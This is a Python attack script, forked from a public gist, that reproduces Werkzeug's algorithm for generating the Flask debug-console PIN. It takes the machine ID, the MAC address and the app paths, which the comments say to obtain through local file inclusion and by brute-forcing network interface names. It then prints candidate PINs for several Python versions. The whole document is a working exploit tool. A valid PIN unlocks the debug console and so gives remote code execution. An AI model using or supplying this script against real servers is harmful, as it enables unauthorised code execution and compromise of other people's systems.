#!/usr/bin/python3

# This script is used to get the Console PIN - Both MD5 and SHA1
# You need to have infomation of -
#   - /etc/machine-id
#   - /sys/class/net/INTERFACE_NAME/address 
#       e.g. if you get 00:50:56:bf:d7:70
#       Python  >>> print(0x005056bfd770)
#                   345052796784 - UUID

#       You can Bruteforce /sys/class/net/ with interface_wordlists.txt 
#       if you have LFI 
 
# Python script forked from: https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get_flask_pin.py

import argparse
import getpass
import sys
import hashlib
import uuid
from itertools import chain

text_type = str

def get_pin(args):
    rv = None
    num = None
    username = args.username
    modname  = args.modname
    appname  = args.appname
    fname    = args.basefile
    hashes   = args.hash 
    probably_public_bits = [username,modname,appname,fname]
    private_bits = [args.uuid, args.machineid]
    if hashes == 'MD5' or hashes == 'md5':
        h = hashlib.md5()
    elif hashes == 'SHA1' or hashes == 'sha1':
        h = hashlib.sha1()
    else:
        print("[!] Select the right hashing algorithm - MD5 or SHA1")
        exit()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, text_type):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                      for x in range(0, len(num), group_size))
                break
        else:
            rv = num
    return rv

if __name__ == "__main__":
    versions = ["2.7", "3.0", "3.1", "3.2", "3.3", "3.4", "3.5", "3.6", "3.7", "3.8"]
    parser = argparse.ArgumentParser(description="tool to get the flask debug pin from system information")
    parser.add_argument("--username", required=False, default="www-data", help="The username of the user running the web server")
    parser.add_argument("--modname", required=False, default="flask.app", help="The module name (app.__module__ or app.__class__.__module__)")
    parser.add_argument("--appname", required=False, default="Flask", help="The app name (app.__name__ or app.__class__.__name__)")
    parser.add_argument("--basefile", required=False, help="The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))")
    parser.add_argument("--hash", required=False, default="MD5", help="The hashing algorithm - MD5/SHA1. Default - MD5")
    parser.add_argument("--uuid", required=True, help="System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)")
    parser.add_argument("--machineid", required=True, help="System machine ID (/etc/machine-id or /proc/sys/kernel/random/boot_id)")

    args = parser.parse_args()
    if args.basefile is None:
        print("[!] App.py base path not provided, trying on Python Versions - 2.7 and 3.0 - 3.8.")
        for v in versions:
            args.basefile = f"/usr/local/lib/python{v}/dist-packages/flask/app.py"
            print(f"Python V{v} PIN: {get_pin(args)}")
    else:
        print("PIN: ",get_pin(args))
